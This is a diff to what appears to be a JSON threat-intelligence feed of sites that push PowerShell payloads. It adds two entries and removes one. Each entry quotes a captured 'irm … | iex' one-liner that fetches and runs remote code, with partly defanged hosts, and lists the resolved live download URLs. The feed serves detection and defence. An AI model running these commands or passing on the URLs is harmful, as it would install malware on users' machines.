@@ -1,5 +1,41 @@
 [
   {
+    "UrlDomain": "deow.edu.vn",
+    "DeliveryUrl": [
+      "github.pw"
+    ],
+    "PayloadUrl": [
+      "https://github.pw/wp/05f60a2f5e22b527"
+    ],
+    "IP": [
+      "163.44.192.252"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://github[.]pw/wp/05f60a2f5e22b527')|iex",
+    "ResolvedDownloadUrl": [
+      "https://github.pw/wp/05f60a2f5e22b527"
+    ],
+    "ReportId": "cmwkp8vhm1fhu0omljubkjak1",
+    "ScannedAt": "2026-11-17T12:59:32.580000+00:00"
+  },
+  {
+    "UrlDomain": "royalfischer.com",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "148.163.100.171"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmwkp88891fgr0omlhjevhb4h",
+    "ScannedAt": "2026-11-17T12:59:02.465000+00:00"
+  },
+  {
     "UrlDomain": "soporte5.jlmarketing.com.mx",
     "DeliveryUrl": [
       "github.pw"
@@ -2760,25 +2796,5 @@
     ],
     "ReportId": "cmwhuqa3y0ubu0oml2z1942tq",
     "ScannedAt": "2026-11-15T13:09:44.284000+00:00"
-  },
-  {
-    "UrlDomain": "esperanzafernandez.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "217.160.0.75"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881"
-    ],
-    "ReportId": "cmwhtrhxt0u6a0omlo9x4ag7g",
-    "ScannedAt": "2026-11-15T12:42:41.466000+00:00"
   }
 ]
